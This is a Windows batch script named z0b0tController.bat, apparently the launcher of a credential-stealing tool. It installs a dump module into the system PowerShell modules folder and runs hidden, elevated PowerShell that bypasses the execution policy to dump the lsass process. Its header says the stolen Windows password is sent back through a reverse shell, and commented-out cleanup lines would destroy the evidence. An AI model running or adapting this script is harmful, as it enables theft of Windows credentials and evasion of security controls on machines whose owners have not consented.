:: NAME: z0b0tController.bat
:: PURPOSE: Guides the execution of the executable
:: PREREQUISITES: Must be run with admin permissions
:: EXTRA INFO: This program will leave the DumpTool in C:\Windows\System32\WindowsPowershell\v1.0\Modules\DumpTool so that affected users can be identified
::             No damage will be done to the computer that executes this program; it only dumps the Windows password from memory and sends it back through a local reverse connection shell
::             I am not liable for any damages done through the use or modification of this program; with that being said, use it at your own risk.

@ECHO OFF
TITLE z0b0t
COLOR 2

:: Copy the dump tool folder to the powershell module directory
XCOPY /Y /S /I "%~dp0\z0b0tSoftware\DumpTool" "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\DumpTool"

:: Bypass the execution policy to dump the memory
:: NOTE: The memory dump will by default (unless manually configured here) be located at C:\Windows\System32
PowerShell.exe -WindowStyle Hidden -NonInteractive -NoLogo -NoProfile -Command "& {Start-Process PowerShell -ArgumentList 'Set-ExecutionPolicy Unrestricted -Force; Get-Module DumpTool | Import-Module; Import-Module DumpTool; Get-Process lsass | DumpTool; Set-ExecutionPolicy Restricted -Force; timeout 45' -Verb RunAs}"

:: Turns the z0b0tClient.py file, lsass_72.dmp file and dumping tool into zero-byte files and deletes them from C:\Windows\System32
:: TYPE nul > "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\DumpTool"
:: TYPE nul > ".\z0b0tClient.py"
:: TYPE nul > ".\lsass_76.dmp"
:: TYPE nul > ".\z0b0t.bat"
:: DEL /Q ".\z0b0tClient.py" "C:\Windows\System32\lsass_76.dmp" ".\z0b0t.bat"
:: RD /S /Q "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\DumpTool"
:: RD /Q "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\DumpTool"

